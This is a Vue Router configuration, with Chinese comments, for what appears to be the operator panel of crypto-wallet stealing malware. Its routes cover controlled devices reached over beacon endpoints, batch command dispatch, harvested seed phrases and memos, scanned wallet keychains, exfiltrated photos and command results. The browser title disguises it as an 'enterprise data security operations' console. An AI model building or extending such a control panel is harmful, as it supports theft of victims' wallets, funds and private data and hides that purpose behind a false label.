import { createRouter, createWebHashHistory, type RouteRecordRaw } from 'vue-router'
import AdminLayout from '@/layouts/AdminLayout.vue'

/**
 * hash 路由：后端静态挂点是扁平的（Go /admin + /admin/assets/{fname}），
 * 没有 SPA history fallback，hash 模式让多视图可直达/刷新，后端零改动。
 *
 * 信息架构按**业务实体**组织（入库解析后的语义），不再按 capture 端点分组：
 *   运营：仪表台 / 设备列表 / 设备控制台 / 访问统计
 *   数据：备忘录 / 钱包钥匙串 / 照片 / 指令结果 / 日志
 *   系统：系统设置
 *
 * 注：应用资产（u 端点 → apps 表）仅入库，供设备上线时映射钱包 / WS 字段，
 *     不再单独展示（无 /apps 路由）。
 */
const children: RouteRecordRaw[] = [
  { path: '', redirect: '/dashboard' },
  {
    path: 'dashboard',
    name: 'dashboard',
    component: () => import('@/views/DashboardView.vue'),
    meta: { title: '仪表台', icon: 'Odometer', group: '运营', desc: '全域态势与关键指标' },
  },
  {
    path: 'devices',
    name: 'devices',
    component: () => import('@/views/DevicesView.vue'),
    meta: { title: '我的设备', icon: 'Monitor', group: '运营', desc: '/a /beacon 受控设备 · 可多选批量下发' },
  },
  {
    path: 'console',
    name: 'console',
    component: () => import('@/views/DeviceConsoleView.vue'),
    meta: { title: '设备控制台', icon: 'Promotion', group: '运营', desc: '按设备独立队列 · 批量异步下发' },
  },
  {
    path: 'access',
    name: 'access',
    component: () => import('@/views/AccessView.vue'),
    meta: { title: '访问统计', icon: 'DataLine', group: '运营', desc: '全量请求审计 + 来访去重' },
  },
  {
    path: 'memos',
    name: 'memos',
    component: () => import('@/views/MemosView.vue'),
    meta: { title: '助记词/备忘录', icon: 'Notebook', group: '数据', desc: '默认只显示含助记词的备忘录（含全部切换）' },
  },
  {
    path: 'forensics',
    name: 'forensics',
    component: () => import('@/views/ForensicsView.vue'),
    meta: { title: '工具检测', icon: 'MagicStick', group: '数据', desc: 'tools/ 取证工具解析 war 回传' },
  },
  {
    path: 'words',
    name: 'words',
    component: () => import('@/views/WordsView.vue'),
    meta: { title: '助记词库', icon: 'Key', group: '数据', desc: '解析/还原出来的助记词' },
  },
  {
    path: 'keychain',
    name: 'keychain',
    component: () => import('@/views/KeychainView.vue'),
    meta: { title: '钱包钥匙串', icon: 'Coin', group: '数据', desc: 'war 钱包包名扫描 · 简洁列表' },
  },
  {
    // 详情页：从 keychain 列表点击跳转；不设 group（不出现在侧栏导航）
    path: 'wallet/:id',
    name: 'wallet-detail',
    component: () => import('@/views/KeychainDetailView.vue'),
    meta: { title: '钱包详情', icon: 'Coin' },
  },
  {
    path: 'photos',
    name: 'photos',
    component: () => import('@/views/PhotosView.vue'),
    meta: { title: '照片', icon: 'Picture', group: '数据', desc: 'ph 回传照片实体（可预览下载）' },
  },
  {
    path: 'results',
    name: 'results',
    component: () => import('@/views/ResultDataView.vue'),
    meta: { title: '指令结果', icon: 'Document', group: '数据', desc: 'result 回传 data 解码落库' },
  },
  {
    path: 'logs',
    name: 'logs',
    component: () => import('@/views/LogsView.vue'),
    meta: { title: '日志', icon: 'ChatLineSquare', group: '数据', desc: '样本端 /log.html 同步打点' },
  },
  {
    path: 'settings',
    name: 'settings',
    component: () => import('@/views/SettingsView.vue'),
    meta: { title: '系统设置', icon: 'Setting', group: '系统', desc: '视图偏好与后端契约说明' },
  },
]

const routes: RouteRecordRaw[] = [
  { path: '/', component: AdminLayout, children },
  { path: '/:pathMatch(.*)*', redirect: '/dashboard' },
]

export const router = createRouter({
  history: createWebHashHistory(),
  routes,
})

export interface NavItem {
  path: string
  title: string
  icon: string
  desc?: string
}

/** 侧栏分组（顺序即展示顺序） */
export const navGroups: Array<{ name: string; items: NavItem[] }> = ['运营', '数据', '系统'].map((g) => ({
  name: g,
  items: children
    .filter((r) => r.meta?.group === g)
    .map((r) => ({
      path: '/' + String(r.path),
      title: r.meta?.title as string,
      icon: r.meta?.icon as string,
      desc: r.meta?.desc as string,
    })),
}))

router.afterEach((to) => {
  const t = (to.meta?.title as string) || '控制台'
  document.title = `企业数据安全运维 · ${t}`
})
